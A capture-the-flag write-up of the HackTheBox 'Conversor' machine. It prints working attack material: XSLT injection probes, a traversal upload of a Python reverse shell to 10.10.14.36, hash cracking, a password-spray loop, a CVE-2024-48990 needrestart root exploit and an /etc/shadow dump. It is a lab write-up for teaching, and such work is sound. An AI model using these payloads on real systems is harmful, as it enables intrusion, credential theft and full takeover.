---
render_with_liquid: false
title: HackTheBox Writeup - Conversor
date: 2025-10-28 14:10:18 +1400
tags: [hackthebox, nmap, linux, feroxbuster, xslt, information-disclosure, source-code-analysis, python, python-flask, xslt-injection, libxslt, file-upload, directory-traversal, scheduled-job-abuse, discover-secrets, sqlite, hashcat, password-spraying, sudo, needrestart]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0b659c391f2803c247e79c77a3284f96.png
    width: 640
    height: 480
---



`Conversor` is an easy-difficulty Linux machine featuring a web application that converts XML documents into visually formatted HTML documents using XSLT stylesheets. By registering an account and reviewing the downloadable source code, we discover that the application processes user-supplied XSLT files without proper sanitisation, leading to an XSLT injection vulnerability. This allows us to write a malicious Python script to a server-side directory that is periodically executed by a cron job, granting an initial shell as `www-data`. Enumerating the application directory reveals a SQLite database file containing user credentials, from which we extract and crack an MD5 password hash to obtain valid SSH access as the user `fismathack`. For privilege escalation, the machine highlights a misconfigured sudo rule allowing execution of `needrestart`, which is vulnerable to [CVE-2024-48990](https://nvd.nist.gov/vuln/detail/CVE-2024-48990), enabling code execution via a controlled `PYTHONPATH` and ultimately allowing us to gain root privileges.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ pt init '10.129.182.31 conversor.htb'
+-----------+--------+---------------+---------------+
|  PROFILE  | STATUS |      IP       |    DOMAIN     |
+-----------+--------+---------------+---------------+
| conversor | on     | 10.129.182.31 | conversor.htb |
+-----------+--------+---------------+---------------+
```


## Nmap

```bash
# Nmap 7.95 scan initiated Tue Oct 28 14:10:17 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.177.85
Nmap scan report for 10.129.177.85
Host is up, received user-set (0.19s latency).
Scanned at 2025-10-28 14:10:18 CST for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 28 14:10:30 2025 -- 1 IP address (1 host up) scanned in 13.21 seconds
```


## 80 - HTTP : Login


### Info

```ruby
http://conversor.htb [302,200] [Login] [Apache/2.4.52 (Ubuntu)] [4b909c3182eb95d45a6095502d860e35863b1ecd] [Apache HTTP Server:2.4.52,Ubuntu]
```

![](/assets/obsidian/073c8019076594265dc007b8bac0c942.png)

### Directory

```bash
[+] cat httpx/urls.txt | feroxbuster -k -A --stdin -w /usr/share/wordlists/dirb/common.txt --dont-scan .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|js|woff|woff2|eot|ttf|otf)$ -I css,png,jpg,gif --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 404,400,500 -r -n --scan-limit 4 -o bulkdirb.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://conversor.htb:80
 🚫  Don't Scan Regex      │ .(tif|tiff|ico|cur|bmp|webp|svg|png|jpg|jpeg|jfif|gif|avif|apngogg|css|js|woff|woff2|eot|ttf|otf)$
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 400, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 🔒  Default Protocol      │ https
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ bulkdirb.txt
 📂  Scan Dir Listings     │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [css, png, jpg, gif]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
 🦥  Concurrent Scan Limit │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       21l       50w      726c http://conversor.htb/register
200      GET       22l       50w      722c http://conversor.htb/login
200      GET       81l      214w     2842c http://conversor.htb/about
200      GET    15716l    86534w  7371827c http://conversor.htb/static/source_code.tar.gz
403      GET        9l       28w      278c http://conversor.htb/javascript/
403      GET        9l       28w      278c http://conversor.htb/server-status
[####################] - 36s     8186/8186    0s      found:6       errors:16
[####################] - 34s     8144/8144    240/s   http://conversor.htb:80/
```


# User Flag
---

## Shell as www-data


### 80 - Conversor : Enumeration

The login page includes a link to register an account

> http://conversor.htb/login

![](/assets/obsidian/031fcf54c83bd9ed007f4197d9a0a4b1.png)

> http://conversor.htb/register

![](/assets/obsidian/697a0e99fc9b78fd73ac09700247ba58.png)

After logging in, we have access to a function that can convert XML file along with a XSLT sheet to another format

> http://conversor.htb/

![](/assets/obsidian/099463b0c8367c76af54bb6a83ce2ccf.png)

There's also a link to download the source code of this web app from the about page

> http://conversor.htb/about

![](/assets/obsidian/c86a9f97735b2d8c04b982cff8e21d18.png)


### 80 - Conversor : Download source code

```bash
mkdir -p loot/80
cd loot/80
wget http://conversor.htb/static/source_code.tar.gz
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Conversor/loot/80]
└─$ 7z l source_code.tar.gz
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-08-15 04:47:23 .....         4461         4608  app.py
2025-07-31 12:00:52 .....           92          512  app.wsgi
2025-08-15 04:52:38 .....          528         1024  install.md
2025-08-15 04:45:26 D....            0            0  instance
2025-08-15 04:45:26 .....        24576        24576  instance/users.db
2025-08-15 04:43:51 D....            0            0  scripts
2025-08-16 08:03:52 D....            0            0  static
2025-07-31 13:14:52 D....            0            0  static/images
2025-07-31 13:14:55 .....      2229125      2229248  static/images/david.png
2025-05-16 00:48:23 .....        98190        98304  static/images/fismathack.png
2025-07-31 13:13:31 .....      1688968      1689088  static/images/arturo.png
2025-08-16 07:47:33 .....         3216         3584  static/nmap.xslt
2025-08-01 08:47:59 .....         5938         6144  static/style.css
2025-08-16 09:17:24 D....            0            0  templates
2025-08-15 03:50:40 .....          771         1024  templates/register.html
2025-08-01 08:52:32 .....         1508         1536  templates/about.html
2025-08-16 09:17:38 .....         1586         2048  templates/index.html
2025-08-15 03:50:33 .....          845         1024  templates/login.html
2025-08-15 04:38:23 .....         1584         2048  templates/base.html
2025-07-31 12:35:43 .....          247          512  templates/result.html
2025-08-15 04:43:02 D....            0            0  uploads
------------------- ----- ------------ ------------  ------------------------
2025-08-16 09:17:38            4061635      4065280  15 files, 6 folders

┌──(bravosec㉿fsociety)-[~/htb/Conversor/loot/80]
└─$ 7z x source_code.tar.gz -o'source_code'
[...]
```

There's nothing in the **sqlite** database, it's just an example file

```bash
┌──(bravosec㉿fsociety)-[~/…/Conversor/loot/80]
└─$ cd source_code

┌──(bravosec㉿fsociety)-[~/…/Conversor/loot/80/source_code]
└─$ sqlite3 instance/users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
CREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    );
DELETE FROM sqlite_sequence;
COMMIT;
```


### Source code Analysis

> - Flask APP
> - There's an app secret key, but it was just a default value
> - File upload doesn't check for **allowed extensions**, and uses `os.path.join(UPLOAD_FOLDER, <user_input>.filename)` that **saves uploaded files to user controlled path**
> - It uses `etree.XMLParser()` with secure parameters to prevent **XXE**, but doesn't prevent **XLST Injection**
{: .prompt-tip }

> `app.py`

```python
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

[...]
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
[...]
```


### 80 - Conversor : Testing XSLT injection

> A good check list for XSLT injection - https://bughra.dev/posts/xslt/

Let's create a sample XML file, and a XSLT file to gather information 

> `test.xml`

```xml
<!--?xml version="1.0" ?-->
<root></root>
```

> `exp.xslt`

```xslt
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>, </xsl:text>
    <xsl:value-of select="system-property('xsl:vendor-url')"/>
    <xsl:text>, </xsl:text>
    <xsl:value-of select="system-property('xsl:version')"/>
  </xsl:template>
</xsl:stylesheet>
```

> http://conversor.htb/

![](/assets/obsidian/c9cefe54457d76aa5c268e336b478ee5.png)

It's using `libxslt` version `1.0`, which mean we don't have access to file system

> It's using `libxslt` version `1.0`, which mean we don't have access to file system
{: .prompt-danger }

![](/assets/obsidian/3d6210fef87d5851393d23b4e815be07.png)

We can check that out by using `document()` function

> `exp.xslt`

```xslt
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

![](/assets/obsidian/2bb01449ce8ff9a55e90477ddda7de06.png)

Out-bound connection is not possible too

> `exp.xslt`

```xslt
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="http://10.10.14.36/malicious.xsl"/>
  <xsl:template match="/">
    <!-- Content here -->
  </xsl:template>
</xsl:stylesheet>
```

![](/assets/obsidian/94b88b5a4009a10bd4a2175b6b7813e1.png)

Other network protocols such as `file://` doesn't work as well

> `exp.xslt`

```xslt
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

![](/assets/obsidian/6fecacf75acaacbe05e8078748ce72f2.png)


### 80 - Conversor : File upload & Directory traversal & Cron jobs leads to RCE

There's a document suggesting that python scripts from `/var/www/conversor.htb/scripts/` might be ran via **cron jobs**

```bash
┌──(bravosec㉿fsociety)-[~/…/Conversor/loot/80/source_code]
└─$ cat install.md
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

Start reverse shell listner

```bash
nc -lvnp 1111
```

Let's upload a python reverse shell to that folder to test it out

```http
POST /convert HTTP/1.1
Host: conversor.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------280750137657489666776710243
Content-Length: 684
Origin: http://conversor.htb
Connection: keep-alive
Referer: http://conversor.htb/
Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImJyYXZvc2VjIn0.aQCQVg.7AGxW3joEoxh1fYh-AuoEn_Sfd4
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------280750137657489666776710243
Content-Disposition: form-data; name="xml_file"; filename="test.xml"
Content-Type: text/xml

<!--?xml version="1.0" ?-->
<root></root>

-----------------------------280750137657489666776710243
Content-Disposition: form-data; name="xslt_file"; filename="../../../../../var/www/conversor.htb/scripts/x.py"
Content-Type: application/xslt+xml

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.36",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

-----------------------------280750137657489666776710243--
```

![](/assets/obsidian/af8904da87a8a588915e42d3d9ab18be.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.36] from (UNKNOWN) [10.129.182.31] 37880
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@conversor:~$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@conversor:~$ stty rows 50 columns 209
www-data@conversor:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## Shell as fismathack


### Harvesting - Sqlite database

Looking for Interesting files

```bash
www-data@conversor:~$ ls -latr
total 12
drwxr-xr-x 13 root     root     4096 Jul 31 03:55 ..
drwxr-x---  8 www-data www-data 4096 Aug 14 21:34 conversor.htb
lrwxrwxrwx  1 root     root        9 Aug 15 05:19 .bash_history -> /dev/null
lrwxrwxrwx  1 root     root        9 Aug 15 05:19 .python_history -> /dev/null
lrwxrwxrwx  1 root     root        9 Aug 15 05:19 .sqlite_history -> /dev/null
drwxr-x---  3 www-data www-data 4096 Aug 15 05:19 .
www-data@conversor:~$ find conversor.htb/
[...]
conversor.htb/app.py
conversor.htb/instance
conversor.htb/instance/users.db
[...]
```

Found a new secret key, but spraying it on local users didn't return any results

```bash
www-data@conversor:~$ cat conversor.htb/app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'C0nv3rs0rIsthek3y29'
[...]
```

Dump hashes from `users` table in `conversor.htb/instance/users.db` to **hashcat** format

```bash
www-data@conversor:~$ sqlite3 conversor.htb/instance/users.db -separator ':' 'select username,password from users'
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
```

Crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ vi loot/users.db.hash
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec

┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 0
hashcat (v6.2.6) starting
[...]

┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 0 --show
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```


### Password spray

```bash
www-data@conversor:~$ PASS='Keepmesafeandwarm'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (echo $PASS | su "$USER" -c whoami) & done
[1] 4487
[2] 4488
www-data@conversor:~$ Password: Password: fismathack
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Conversor]
└─$ sshpass -p 'Keepmesafeandwarm' ssh -o "StrictHostKeyChecking no" fismathack@10.129.182.31
Warning: Permanently added '10.129.182.31' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
[...]
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
fismathack@conversor:~$ cat user.txt
b84cbafa5e3c3cb8e8fbc71ea3dfa1f5
```


# Root Flag
---

## Shell as root


### SUDO - needrestart 3.7 : Privilege Escalation (CVE-2024-48990)

- `fismathack` can run `/usr/sbin/needrestart` as `root` without its password

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

```bash
fismathack@conversor:~$ ls -la /usr/sbin/needrestart
-rwxr-xr-x 1 root root 43578 Jul 31 01:49 /usr/sbin/needrestart
fismathack@conversor:~$ file /usr/sbin/needrestart
/usr/sbin/needrestart: Perl script text executable
```

> `needrestart` is a **Linux utility** that detects which services or processes need to be restarted after a system update — especially when new versions of libraries, kernels, or core packages have been installed.
{: .prompt-info }

```bash
fismathack@conversor:~$ /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```

- Google : `needrestart 3.7 exploit`

> Related Article & POC - https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80

> **CVE-2024-48990**
> 
> **needrestart** before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.
{: .prompt-info }

Make our malicious `importlib` python module that copies `bash` to `/tmp/` then give it **SETUID** bits, so that any users can execute `bash` on behalf of its owner (which is `root`)

```bash
fismathack@conversor:~$ mkdir -p /tmp/cache/importlib/
cat << 'EOF' > /tmp/cache/importlib/__init__.py
import os; os.system("/bin/cp /bin/bash /tmp/b; /bin/chmod +s /tmp/b")
EOF
```

Set `PYTHONPATH` to our controlled location to hijack `importlib`, and run a python script that loops infinitely to trigger the Python interpreter scan from `needrestart` with our desired `PYTHONPATH` value

```bash
fismathack@conversor:~$ cat << 'EOF' > /tmp/cache/job.py
import time

while 1:
    time.sleep(1)
EOF

PYTHONPATH="/tmp/cache/" python3 /tmp/cache/job.py
```

![](/assets/obsidian/d1925f47d9799f2374f189e5d42f7faa.png)

Run `needrestart` as `root` to load our malicious `importlib`

```bash
fismathack@conversor:~$ sudo needrestart
Scanning processes...
Scanning linux images...

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

We can now run `bash` with preserved `root` **euid**, then set **uid** to `root` with the help of **python**'s `os.setuid()` function

```bash
fismathack@conversor:~$ /tmp/b -p
b-5.1# id
uid=1000(fismathack) gid=1000(fismathack) euid=0(root) egid=0(root) groups=0(root),1000(fismathack)
b-5.1# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
root@conversor:~# id
uid=0(root) gid=1000(fismathack) groups=1000(fismathack)
root@conversor:~# cat /root/root.txt
5e449dce82a367a3b862df7b88aed079
root@conversor:~# rm /tmp/b
root@conversor:~# 
```

> We can also get root by injecting malicious python code into the config file
> 
> ```bash
> fismathack@conversor:~$ echo 'system("/bin/bash")' > /tmp/x.py
> fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /tmp/x.py
> root@conversor:/home/fismathack# id
> uid=0(root) gid=0(root) groups=0(root)
> ```
{: .prompt-tip }


# Additional
---

## Post exploitation


### Secrets

```bash
root@conversor:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$CxUp91Y7aNmCAg.0BrP1N1$NFfbRCjYo56DBVoop2pwSbs9snvrUGR0IEINR4qZfmB:20301:0:99999:7:::
fismathack:$y$j9T$Em7KF.PXS5RiFQPkRzVUo.$tMXvaVSk5wpypsh250ddml9Ko./E8.7DnQSgs2AhKx2:20314:0:99999:7:::
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```